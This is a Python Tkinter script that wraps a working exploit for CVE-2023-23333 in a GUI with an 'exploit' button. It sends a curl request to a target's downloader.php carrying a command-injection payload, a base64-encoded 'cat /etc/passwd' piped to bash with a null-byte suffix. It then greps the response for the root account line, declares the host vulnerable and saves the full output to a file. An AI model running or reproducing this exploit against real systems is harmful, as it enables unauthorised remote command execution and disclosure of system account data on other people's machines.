import subprocess
import tkinter
from tkinter import *
import tkinter as tk
from tkinter.ttk import *
from time import strftime
from tkinter import ttk
def Apacheld():
    root = tkinter.Tk()
    root.title("CVE-2023-23333 exploits")
    root.geometry('800x600+0+0')
    def printInput():
        inp = inputtxt.get(1.0, "end-1c")
        lbl.config(text = "attack url : "+inp)
        ip_address = inp
        scroll_y = Scrollbar(root, orient=VERTICAL)
        txtarea = Text(root, yscrollcommand=scroll_y.set, font=("times new roman", 15, "bold"), fg="#3206b8")
        scroll_y.pack(side=RIGHT, fill=Y)
        scroll_y.config(command=txtarea.yview)
        txtarea.pack(fill=BOTH, expand=True)
        txtarea.configure(state ='disabled')
# Prompt ip address

# Craft command
        command = 'curl "http://{}/downloader.php?file=;echo%20Y2F0IC9ldGMvcGFzc3dkCg%3D%3D|base64%20-d|bash%00.zip" | grep "root:.*:0:0"'.format(ip_address)

# Execute command 
        output_bytes = subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL)

# Decode 
        output = output_bytes.decode("utf-8-sig", errors='replace')

# Check
        if 'root' in output:
            txtarea.insert(END, f"The IP address {ip_address} is vulnerable to CVE-2023-23333.\n")
            txtarea.insert(END, "Output:\n")
            txtarea.insert(END, output)
           # print("The IP address {} is vulnerable to CVE-2023-23333.".format(ip_address))
            #print("Output:")
            #print(output)

    # Write full report
            full_output_command = 'curl "http://{}/downloader.php?file=;echo%20Y2F0IC9ldGMvcGFzc3dkCg%3D%3D|base64%20-d|bash%00.zip"'.format(ip_address)
            full_output_bytes = subprocess.check_output(full_output_command, shell=True, stderr=subprocess.DEVNULL)
            full_output = full_output_bytes.decode("utf-8-sig", errors='replace')
            with open("full-output.txt", "w") as file:
                file.write(full_output)
                txtarea.insert(END, "The full output has been saved to 'full-output.txt'.")
                #print("The full output has been saved to 'full-output.txt'.")

        else:
            #print("The IP address {} is not vulnerable to CVE-2023-23333.".format(ip_address))
            txtarea.insert(END, f"The IP address {ip_address} is not vulnerable to CVE-2023-23333.")


    Hacher = Label(root, text="Enter url or domin www.example.com : ").pack()
    inputtxt = tk.Text(root,height = 1,width = 80)
    inputtxt.pack()
    printButton = tk.Button(root,text = "exploit", command = printInput)
    printButton.pack()
    lbl = tk.Label(root, text = "")
    lbl.pack()
    root.mainloop()



